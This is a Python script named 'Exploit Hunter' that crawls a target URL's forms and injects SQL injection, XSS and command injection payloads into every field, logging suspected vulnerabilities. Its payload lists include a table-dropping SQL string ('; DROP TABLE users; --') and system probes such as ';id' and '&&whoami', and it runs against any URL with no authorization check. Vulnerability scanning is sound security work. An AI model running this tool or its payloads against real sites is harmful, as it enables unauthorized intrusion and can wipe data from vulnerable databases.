#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import colorama
from colorama import Fore
import sys
import urllib.parse
import argparse
import logging
import json
import time

colorama.init(autoreset=True)

# Setup logging: log to file and console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("exploit_hunter.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Payloads for scanning
SQL_PAYLOADS = ["' OR 1=1--", "' OR '1'='1", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ['<script>alert(1)</script>', '"><script>alert(1)</script>']
CMD_INJECTION_PAYLOADS = [';id', '&&whoami', '`whoami`']
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; ExploitHunter/1.0; +https://yourdomain.com/bot)"
}

# ----------------------------------------
# Utility functions
# ----------------------------------------

def get_all_forms(url):
    """Return all forms from a URL."""
    try:
        res = requests.get(url, headers=HEADERS, timeout=(10, 10))
        res.raise_for_status()
    except requests.RequestException as e:
        logger.error(f"Error fetching URL {url}: {e}")
        return []
    soup = BeautifulSoup(res.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form, base_url):
    """Extract form details."""
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # Build absolute URL for form action
    url = urllib.parse.urljoin(base_url, action) if action else base_url
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    details["url"] = url
    return details

def submit_form(form_details, payload):
    """Submit form data with payload injected."""
    url = form_details["url"]
    data = {}
    for input_tag in form_details["inputs"]:
        # Skip submit buttons and those without a name attribute
        if input_tag["type"] == "submit" or input_tag["name"] is None:
            continue
        data[input_tag["name"]] = payload
    logger.info(f"Submitting payload to {url} with value: {payload}")
    try:
        if form_details["method"] == "post":
            res = requests.post(url, data=data, headers=HEADERS, timeout=(10, 10))
        else:
            res = requests.get(url, params=data, headers=HEADERS, timeout=(10, 10))
        time.sleep(1)  # delay to be polite to server
        return res
    except requests.RequestException as e:
        logger.error(f"Error submitting form to {url}: {e}")
        return None

# ----------------------------------------
# Vulnerability scanning functions
# ----------------------------------------

def scan_sqli(form_details):
    """Scan form for SQL Injection."""
    for payload in SQL_PAYLOADS:
        res = submit_form(form_details, payload)
        if not res:
            continue
        for error in SQL_ERRORS:
            if error in res.text.lower():
                logger.warning(f"SQL Injection vulnerability detected at {form_details['url']}")
                return True
    return False

def scan_xss(form_details):
    """Scan form for reflected XSS."""
    for payload in XSS_PAYLOADS:
        res = submit_form(form_details, payload)
        if not res:
            continue
        if payload in res.text:
            logger.warning(f"XSS vulnerability detected at {form_details['url']}")
            return True
    return False

def scan_cmd_injection(form_details):
    """Simulated command injection scan â€” checks for common system output."""
    for payload in CMD_INJECTION_PAYLOADS:
        res = submit_form(form_details, payload)
        if not res:
            continue
        # Check for common outputs in response to cmd injections
        if any(x in res.text.lower() for x in ["uid=", "gid=", "root", "user", "command not found"]):
            logger.warning(f"Potential command injection vulnerability detected at {form_details['url']}")
            return True
    return False

# ----------------------------------------
# Main scanning logic
# ----------------------------------------

def scan(url, scan_sqli_flag, scan_xss_flag, scan_cmd_flag):
    forms = get_all_forms(url)
    if not forms:
        logger.info(f"No forms found on {url}")
        return []

    logger.info(f"Detected {len(forms)} form(s) on {url}")
    scan_results = []

    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form, url)
        logger.info(f"Scanning form #{i} at {form_details['url']}")

        result = {
            "form_number": i,
            "url": form_details['url'],
            "vulnerabilities": []
        }

        if scan_sqli_flag:
            if scan_sqli(form_details):
                result["vulnerabilities"].append("SQL Injection")
        if scan_xss_flag:
            if scan_xss(form_details):
                result["vulnerabilities"].append("XSS")
        if scan_cmd_flag:
            if scan_cmd_injection(form_details):
                result["vulnerabilities"].append("Command Injection")

        if not result["vulnerabilities"]:
            logger.info(f"No vulnerabilities detected in form #{i}.\n")
        else:
            logger.info(f"Vulnerabilities found in form #{i}: {', '.join(result['vulnerabilities'])}\n")

        scan_results.append(result)

    return scan_results

# ----------------------------------------
# JSON report output
# ----------------------------------------

def save_report(data, filename):
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        logger.info(f"Scan results saved to {filename}")
    except IOError as e:
        logger.error(f"Failed to save report to {filename}: {e}")

# ----------------------------------------
# Command line parsing
# ----------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(description="Basic Exploit Hunter Tool: Automated scanning for SQLi, XSS, and Command Injection.")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--no-sqli", action="store_true", help="Skip SQL Injection scanning")
    parser.add_argument("--no-xss", action="store_true", help="Skip XSS scanning")
    parser.add_argument("--no-cmd", action="store_true", help="Skip Command Injection scanning")
    parser.add_argument("--json", metavar="FILE", help="Save scan results as JSON to the specified file")
    return parser.parse_args()

# ----------------------------------------
# Main entry point
# ----------------------------------------

def main():
    args = parse_args()
    url = args.url

    # Determine which scans to run (default all enabled)
    scan_sqli_flag = not args.no_sqli
    scan_xss_flag = not args.no_xss
    scan_cmd_flag = not args.no_cmd

    logger.info(f"Starting scan on {url}")
    results = scan(url, scan_sqli_flag, scan_xss_flag, scan_cmd_flag)

    if args.json:
        save_report(results, args.json)

if __name__ == "__main__":
    main()

